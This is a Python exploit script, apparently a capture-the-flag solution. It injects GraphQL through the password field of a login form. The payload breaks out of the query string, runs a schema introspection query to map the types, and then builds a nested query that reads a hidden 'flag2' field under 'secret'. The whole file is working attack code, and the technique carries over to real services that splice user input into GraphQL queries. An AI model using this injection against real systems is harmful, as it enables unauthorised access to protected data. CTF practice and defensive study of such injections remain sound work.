import re
import html
import ast
import ssl
import trio
import httpx

async def query(client, login_url, payload):
    r = await client.post(login_url,
                          data={"username": 123, "password": payload},
                          follow_redirects=True)
    print(r)
    r.raise_for_status()

    match = re.search(r"<strong>用户名</strong>\s+<div>(.*?)</div>", r.text)
    if match is None:
        raise RuntimeError("not found")
    result_html = match.group(1)
    result_str = html.unescape(result_html)
    return ast.literal_eval(result_str)

async def main():
    # https://www.python-httpx.org/advanced/ssl/
    # https://github.com/python/cpython/issues/95031
    ctx = ssl.create_default_context()
    client = httpx.AsyncClient(verify=ctx)

    start_url = httpx.URL(input("url: "))
    r = await client.get(start_url, follow_redirects=True)
    url = r.url
    print(r, url)
    r.raise_for_status()

    login_url = url.copy_with(raw_path=b"/login")
    payload = """\
") {
login: __schema {
  ok: __typename
  isAdmin: __typename
  username: types {
    name
    fields {
      name
      type {
        name
      }
    }
  }
}
foobar: #"""
    types = await query(client, login_url, payload)
    print(len(types))

    for t in types:
        for f in t["fields"] or []:
            if f["name"] == "flag2":
                flag_type = t
                break

    def find_parent_types(field_type_name):
        for t in types:
            for f in t["fields"] or []:
                if f["type"]["name"] == field_type_name:
                    yield t, f["name"]

    field_names = ["flag2"]
    current_type_name = flag_type["name"]
    while field_names[-1] != "secret":
        parent_types = list(find_parent_types(current_type_name))
        if len(parent_types) > 1:
            print(parent_types)
        parent_type, field_name = parent_types[0]
        field_names.append(field_name)
        current_type_name = parent_type["name"]

    print(field_names)

    query_flag2 = "flag2"
    for field_name in field_names[1:-1]:
        query_flag2 = f"{field_name} {{ {query_flag2} }}"

    payload = """\
") {
login: secret {
  ok: __typename
  isAdmin: __typename
  username: @fieldnames@
}
foobar: #""".replace("@fieldnames@", query_flag2)
    print(payload)
    print(await query(client, login_url, payload))


if __name__ == "__main__":
    trio.run(main)
